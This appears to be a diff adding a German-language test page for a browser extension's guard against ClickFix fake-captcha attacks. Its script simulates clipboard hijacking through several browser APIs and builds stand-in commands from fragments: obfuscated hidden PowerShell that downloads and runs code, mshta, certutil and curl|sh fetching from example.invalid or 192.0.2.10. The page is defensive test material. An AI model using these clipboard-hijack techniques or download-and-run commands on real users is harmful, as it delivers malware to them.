@@ -1,0 +1,295 @@
+<!doctype html>
+<!--
+  Bastion Shield — ClickFix demo page for manual testing of the nerd-mode
+  clipboard guard (docs/NERD-MODE.md). Every "attack" is inert: commands only
+  print text or point at example.invalid, and they are assembled at runtime
+  from fragments so the file itself carries no malware-like strings.
+
+  Serve it from http://127.0.0.1 (uBlock filters' generic ClickFix rule
+  excludes 127.0.0.1, so only Bastion's own guard acts), with nerd mode and
+  the ClickFix protection on:
+    python -m http.server 8765 --bind 127.0.0.1 --directory test/fixtures
+    → http://127.0.0.1:8765/clickfix-demo.html
+
+  SPDX-License-Identifier: GPL-3.0-or-later
+-->
+<html lang="de">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ClickFix-Testseite · Bastion Shield</title>
+<style>
+  :root {
+    --bg: #FFFFFF; --surface: #F2F4F5; --sep: #E4E8E9; --text: #17171A; --text-2: #4C575D;
+    --line: #D7DDDF; --accent: #171C1E; --on-accent: #FFFFFF; --code: #E4E8E9;
+    --high: #17171A; --tag-high: #171C1E; --tag-medium: #4C575D; --tag-ok: #7A878C;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #131215; --surface: #1D2124; --sep: #2A3134; --text: #F1EDE6; --text-2: #A9B6BA;
+      --line: #2A3134; --accent: #F1EDE6; --on-accent: #131215; --code: #2A3134;
+      --tag-high: #F1EDE6; --tag-medium: #A9B6BA; --tag-ok: #7A878C;
+    }
+  }
+  * { box-sizing: border-box; }
+  body { margin: 0; background: var(--bg); color: var(--text); font: 15px/1.5 Inter, system-ui, -apple-system, "Segoe UI", sans-serif; }
+  main { max-width: 920px; margin: 0 auto; padding: 40px 20px 80px; }
+  h1 { margin: 0 0 6px; font-size: 34px; line-height: 1.15; letter-spacing: -0.02em; }
+  .lead { margin: 0 0 22px; color: var(--text-2); max-width: 70ch; }
+  .setup { background: var(--surface); border-radius: 18px; padding: 16px 20px; margin-bottom: 28px; font-size: 14px; }
+  .setup ol { margin: 6px 0 0; padding-left: 20px; }
+  .setup li { margin: 2px 0; }
+  .env { margin-top: 10px; font-family: ui-monospace, "IBM Plex Mono", Consolas, monospace; font-size: 12.5px; color: var(--text-2); }
+  .env b { color: var(--text); font-weight: 600; }
+  h2 { font-size: 13px; font-weight: 500; color: var(--text-2); margin: 26px 4px 8px; }
+  .grid { display: grid; grid-template-columns: 1fr; gap: 10px; }
+  @media (min-width: 760px) { .grid { grid-template-columns: 1fr 1fr; } }
+  .card { background: var(--surface); border-radius: 18px; padding: 16px 18px; display: flex; flex-direction: column; gap: 10px; }
+  .card h3 { margin: 0; font-size: 15px; font-weight: 600; }
+  .card p { margin: 0; font-size: 13.5px; color: var(--text-2); }
+  .meta { display: flex; flex-wrap: wrap; gap: 6px; align-items: center; }
+  .tag { font: 500 11px/1 ui-monospace, "IBM Plex Mono", Consolas, monospace; padding: 4px 7px; border-radius: 999px; border: 1px solid var(--line); color: var(--text-2); }
+  .tag--high { background: var(--tag-high); color: var(--bg); border-color: transparent; }
+  .tag--medium { border-color: var(--tag-medium); color: var(--text); }
+  .tag--ok { color: var(--text-2); }
+  .expect { font-size: 13px; color: var(--text); }
+  .expect::before { content: "Erwartet: "; color: var(--text-2); }
+  code, pre { font-family: ui-monospace, "IBM Plex Mono", Consolas, monospace; font-size: 12.5px; }
+  pre { margin: 0; background: var(--code); border-radius: 10px; padding: 10px 12px; white-space: pre-wrap; word-break: break-all; }
+  button { font: 600 14px/1 inherit; font-family: inherit; border: 0; border-radius: 999px; padding: 11px 16px; cursor: pointer; background: var(--accent); color: var(--on-accent); align-self: flex-start; }
+  button.secondary { background: transparent; color: var(--text); box-shadow: inset 0 0 0 1px var(--line); }
+  .captcha { display: flex; align-items: center; gap: 12px; background: var(--bg); border: 1px solid var(--line); border-radius: 10px; padding: 12px 14px; cursor: pointer; user-select: none; }
+  .captcha .box { width: 22px; height: 22px; border: 2px solid var(--text-2); border-radius: 4px; flex-shrink: 0; }
+  .captcha.done .box { background: var(--accent); border-color: var(--accent); }
+  .selectme { background: var(--bg); border: 1px dashed var(--line); border-radius: 10px; padding: 10px 12px; font-size: 14px; }
+  .hidden-src { position: fixed; left: -9999px; top: 0; width: 1px; height: 1px; opacity: 0; }
+  .paste { position: sticky; bottom: 0; margin-top: 30px; background: var(--surface); border-radius: 18px; padding: 14px 18px; box-shadow: 0 -8px 24px rgba(0,0,0,.06); }
+  .paste label { font-size: 13px; color: var(--text-2); display: block; margin-bottom: 6px; }
+  .paste textarea { width: 100%; min-height: 64px; resize: vertical; border: 1px solid var(--line); border-radius: 10px; padding: 8px 10px; background: var(--bg); color: var(--text); font: 12.5px/1.5 ui-monospace, "IBM Plex Mono", Consolas, monospace; }
+  .log { font-size: 12.5px; color: var(--text-2); margin-top: 6px; min-height: 18px; }
+</style>
+</head>
+<body>
+<main>
+  <h1>ClickFix-Testseite</h1>
+  <p class="lead">Simulierte «Fake-Captcha»-Angriffe: Die Seite versucht, einen Befehl in Ihre Zwischenablage zu legen, den Sie dann in «Ausführen», Terminal oder PowerShell einfügen sollen. Alle Befehle sind harmlos (sie geben nur Text aus oder zeigen auf <code>example.invalid</code>).</p>
+
+  <div class="setup">
+    <strong>Vorbereitung</strong>
+    <ol>
+      <li>Bastion Shield: Einstellungen → Nerd-Modus einschalten, «ClickFix-Schutz (Zwischenablage)» an.</li>
+      <li>Diese Seite über <code>http://127.0.0.1:…</code> öffnen. Dort ist nur der Bastion-Schutz aktiv; über <code>localhost</code> greifen zusätzlich die uBlock-Filter zuerst.</li>
+      <li>Szenario anklicken, dann unten mit Ctrl+V einfügen und sehen, was wirklich in der Zwischenablage gelandet ist.</li>
+    </ol>
+    <div class="env" id="env"></div>
+  </div>
+
+  <h2>Eindeutige Angriffsmuster – werden ersetzt, kein «Trotzdem kopieren»</h2>
+  <div class="grid">
+    <section class="card">
+      <div class="meta"><span class="tag tag--high">hoch</span><span class="tag">navigator.clipboard.writeText</span></div>
+      <h3>1 · Fake-Captcha «Ich bin kein Roboter»</h3>
+      <p>Der Klick auf die Checkbox kopiert heimlich einen PowerShell-Befehl mit Köder-Kommentar. Die Seite fordert dann zu Win+R, Ctrl+V, Enter auf.</p>
+      <div class="captcha" id="captcha"><span class="box"></span><span>Ich bin kein Roboter</span></div>
+      <div class="expect">Bastion-Hinweis oben rechts, ohne Kopier-Button</div>
+    </section>
+
+    <section class="card">
+      <div class="meta"><span class="tag tag--high">hoch</span><span class="tag">writeText · -EncodedCommand</span></div>
+      <h3>2 · Verschlüsseltes PowerShell</h3>
+      <p>Der eigentliche Befehl steckt Base64-kodiert hinter <code>-enc</code>, damit ihn niemand lesen kann.</p>
+      <button data-run="encoded">Verifizierung starten</button>
+      <div class="expect">Hinweis, Befehl ersetzt</div>
+    </section>
+
+    <section class="card">
+      <div class="meta"><span class="tag tag--high">hoch</span><span class="tag">Entschleierung ^ und ""</span></div>
+      <h3>3 · Getarntes PowerShell im versteckten Fenster</h3>
+      <p><code>p^o^w^e^r…</code> und <code>pow""ershell</code> umgehen einfache Muster (auch die der uBlock-Filter). Bastion entfernt die Tarnung vor der Prüfung.</p>
+      <button data-run="obfuscated">Code kopieren</button>
+      <div class="expect">Hinweis, Befehl ersetzt</div>
+    </section>
+
+    <section class="card">
+      <div class="meta"><span class="tag tag--high">hoch</span><span class="tag">navigator.clipboard.write()</span></div>
+      <h3>4 · mshta über ClipboardItem</h3>
+      <p>Nutzt die neuere Clipboard-API mit <code>ClipboardItem</code>, die uBlock nicht überwacht.</p>
+      <button data-run="clipboardItem">Fix anwenden</button>
+      <div class="expect">Hinweis, Befehl ersetzt</div>
+    </section>
+
+    <section class="card">
+      <div class="meta"><span class="tag tag--high">hoch</span><span class="tag">execCommand('copy') · verstecktes Feld</span></div>
+      <h3>5 · certutil-Download aus verstecktem Textfeld</h3>
+      <p>Klassischer Trick: unsichtbares Textfeld füllen, markieren, <code>document.execCommand('copy')</code>.</p>
+      <button data-run="execCommand">Fehler beheben</button>
+      <div class="expect">Hinweis, Befehl ersetzt</div>
+    </section>
+
+    <section class="card">
+      <div class="meta"><span class="tag tag--high">hoch</span><span class="tag">copy-Event · setData</span></div>
+      <h3>6 · Austausch beim Kopieren (Ctrl+C)</h3>
+      <p>Markieren Sie den Code unten und drücken Sie Ctrl+C. Die Seite tauscht den Inhalt im Kopier-Ereignis gegen einen <code>cmd /c</code>-Befehl aus.</p>
+      <div class="selectme" id="swap">Bestätigungscode: 4821-7730</div>
+      <div class="expect">Hinweis, statt des Codes landet der Bastion-Hinweistext in der Zwischenablage</div>
+    </section>
+
+    <section class="card">
+      <div class="meta"><span class="tag tag--high">hoch</span><span class="tag">writeText · macOS</span></div>
+      <h3>7 · macOS: Base64 in die Shell</h3>
+      <p>Variante für Mac-Nutzer: kodierter Text wird dekodiert und direkt an <code>sh</code> übergeben.</p>
+      <button data-run="macBase64">Für macOS kopieren</button>
+      <div class="expect">Hinweis, Befehl ersetzt</div>
+    </section>
+
+    <section class="card">
+      <div class="meta"><span class="tag tag--high">hoch</span><span class="tag">writeText · Klick-fix.nl-Typ</span></div>
+      <h3>8 · Verstecktes PowerShell ohne Download</h3>
+      <p>Wie die Demo von click-fix.nl: <code>-NoP -W Hidden</code> zeigt nur ein Fenster – trotzdem hat keine Website einen Grund, so etwas zu kopieren.</p>
+      <button data-run="hiddenNoDownload">Umfrage öffnen</button>
+      <div class="expect">Hinweis, Befehl ersetzt</div>
+    </section>
+  </div>
+
+  <h2>Installations-Einzeiler – mit «Trotzdem kopieren»</h2>
+  <div class="grid">
+    <section class="card">
+      <div class="meta"><span class="tag tag--medium">mittel</span><span class="tag">writeText · nicht sichtbar</span></div>
+      <h3>9 · Versteckter <code>curl … | sh</code></h3>
+      <p>Ein Install-Befehl, der nirgends auf der Seite steht. Kann legitim sein, ist hier aber verdächtig.</p>
+      <button data-run="hiddenInstall">Installieren</button>
+      <div class="expect">Hinweis mit rotem «Trotzdem kopieren»</div>
+    </section>
+
+    <section class="card">
+      <div class="meta"><span class="tag tag--high">hoch</span><span class="tag">writeText · über http://</span></div>
+      <h3>10 · Install-Befehl über unverschlüsseltes http</h3>
+      <p>Gleicher Einzeiler, aber das Skript kommt über <code>http://</code> von einer IP-Adresse. Das macht keine echte Anleitung.</p>
+      <button data-run="insecureInstall">Installieren</button>
+      <div class="expect">Hinweis, ohne Kopier-Button</div>
+    </section>
+  </div>
+
+  <h2>Legitim – wird nicht blockiert</h2>
+  <div class="grid">
+    <section class="card">
+      <div class="meta"><span class="tag tag--ok">erlaubt</span><span class="tag">sichtbarer Codeblock</span></div>
+      <h3>11 · Kopieren-Button neben einer Anleitung</h3>
+      <p>Wie bei Docker, Homebrew oder rustup: Der Befehl steht sichtbar auf der Seite.</p>
+      <pre id="visibleInstall"></pre>
+      <button class="secondary" data-run="visibleInstall">Kopieren</button>
+      <div class="expect">Kein Hinweis, Befehl wird kopiert</div>
+    </section>
+
+    <section class="card">
+      <div class="meta"><span class="tag tag--ok">erlaubt</span><span class="tag">normaler Text</span></div>
+      <h3>12 · Gewöhnlicher Text</h3>
+      <p>Ein Gutscheincode, ein Git-Befehl – nichts Gefährliches.</p>
+      <button class="secondary" data-run="benign">Code kopieren</button>
+      <div class="expect">Kein Hinweis, Text wird kopiert</div>
+    </section>
+  </div>
+
+  <div class="paste">
+    <label for="paste">Hier mit Ctrl+V einfügen: Was liegt wirklich in der Zwischenablage?</label>
+    <textarea id="paste" spellcheck="false" placeholder="Ctrl+V"></textarea>
+    <div class="log" id="log"></div>
+  </div>
+</main>
+
+<textarea class="hidden-src" id="hiddenSrc" aria-hidden="true" tabindex="-1"></textarea>
+
+<script>
+  // Inert payloads, assembled from fragments at runtime.
+  const j = (...p) => p.join('');
+  const PS = j('power', 'shell');
+  const HOST = 'example.invalid';
+  // UTF-16LE base64 of a harmless command, as -EncodedCommand expects.
+  const enc16 = (s) => btoa(Array.from(s, (c) => c + '\u0000').join(''));
+  const say = j('Write', '-Output', ' "Bastion test"');
+
+  const payloads = {
+    captcha: () => j(PS, ' -c ', say, ' # I am not a robot - reCAPTCHA Verification ID: 4821'),
+    encoded: () => j(PS, ' -NoProfile -', 'enc ', enc16(j('Write', '-Output test'))),
+    obfuscated: () => j('p^o^w^e^r^s^h^e^l^l', ' -w h', 'idden -c "i', '`e`x (i', 'rm https://', HOST, '/v.txt)"'),
+    clipboardItem: () => j('ms', 'hta https://', HOST, '/verify.hta'),
+    execCommand: () => j('cert', 'util -url', 'cache -split -f https://', HOST, '/update.txt %TEMP%\\update.txt'),
+    swap: () => j('cmd', ' /c curl -o %TEMP%\\fix.txt https://', HOST, '/fix.txt'),
+    macBase64: () => j('echo ', btoa('echo Bastion test; echo done again ok'), ' | base64 -d | ', 'sh'),
+    hiddenNoDownload: () => j(PS, ' -NoP -W Hidden -C "Add-Type -As System.Windows.Forms;[Windows.Forms.MessageBox]::Show(\'Bastion test\',\'ALERT\',0,16)"'),
+    hiddenInstall: () => j('curl -fsSL https://', HOST, '/hidden-install.sh | ', 'sh'),
+    insecureInstall: () => j('curl -fsSL http://192.0.2.10/install.sh | ', 'sh'),
+    visibleInstall: () => j('curl -fsSL https://', HOST, '/install.sh | ', 'sh'),
+    benign: () => 'BASTION-2026  ·  git clone https://github.com/example/repo.git',
+  };
+
+  const log = (msg) => { document.getElementById('log').textContent = msg; };
+  const write = async (text, how) => {
+    try {
+      await navigator.clipboard.writeText(text);
+      log(`Seite hat per ${how} geschrieben. Jetzt unten einfügen (Ctrl+V).`);
+    } catch (e) {
+      log(`Schreiben fehlgeschlagen: ${e && e.message ? e.message : e}`);
+    }
+  };
+
+  document.getElementById('visibleInstall').textContent = payloads.visibleInstall();
+
+  document.getElementById('captcha').addEventListener('click', (e) => {
+    e.currentTarget.classList.add('done');
+    void write(payloads.captcha(), 'writeText');
+  });
+
+  const runners = {
+    clipboardItem: async () => {
+      try {
+        const blob = new Blob([payloads.clipboardItem()], { type: 'text/plain' });
+        await navigator.clipboard.write([new ClipboardItem({ 'text/plain': blob })]);
+        log('Seite hat per clipboard.write() geschrieben. Jetzt unten einfügen (Ctrl+V).');
+      } catch (e) {
+        log(`Schreiben fehlgeschlagen: ${e && e.message ? e.message : e}`);
+      }
+    },
+    execCommand: () => {
+      const ta = document.getElementById('hiddenSrc');
+      ta.value = payloads.execCommand();
+      ta.select();
+      const ok = document.execCommand('copy');
+      window.getSelection()?.removeAllRanges();
+      ta.value = '';
+      log(`Seite hat per execCommand('copy') kopiert (${ok ? 'ok' : 'abgelehnt'}). Jetzt unten einfügen (Ctrl+V).`);
+    },
+  };
+
+  for (const btn of document.querySelectorAll('[data-run]')) {
+    btn.addEventListener('click', () => {
+      const id = btn.dataset.run;
+      if (runners[id]) return void runners[id]();
+      void write(payloads[id](), 'writeText');
+    });
+  }
+
+  // Scenario 6: swap the user's own copy for a command.
+  document.addEventListener('copy', (e) => {
+    const sel = String(window.getSelection() || '');
+    if (!sel.includes('4821')) return;
+    e.clipboardData.setData('text/plain', payloads.swap());
+    e.preventDefault();
+    log('Seite hat Ihr Ctrl+C im copy-Ereignis ausgetauscht. Jetzt unten einfügen (Ctrl+V).');
+  });
+
+  document.getElementById('paste').addEventListener('paste', () => {
+    setTimeout(() => {
+      const v = document.getElementById('paste').value;
+      log(v.includes('Bastion Shield blocked') ? '✓ Bastion hat den Befehl ersetzt.' : 'Eingefügt.');
+    }, 0);
+  });
+
+  const host = location.hostname;
+  document.getElementById('env').innerHTML =
+    host === '127.0.0.1'
+      ? 'Geöffnet über <b>127.0.0.1</b>: nur der Bastion-ClickFix-Schutz ist aktiv.'
+      : `Geöffnet über <b>${host || location.protocol}</b>: Wo die uBlock-Filter greifen, blockieren sie zuerst. Für den reinen Bastion-Test 127.0.0.1 verwenden.`;
+</script>
+</body>
+</html>
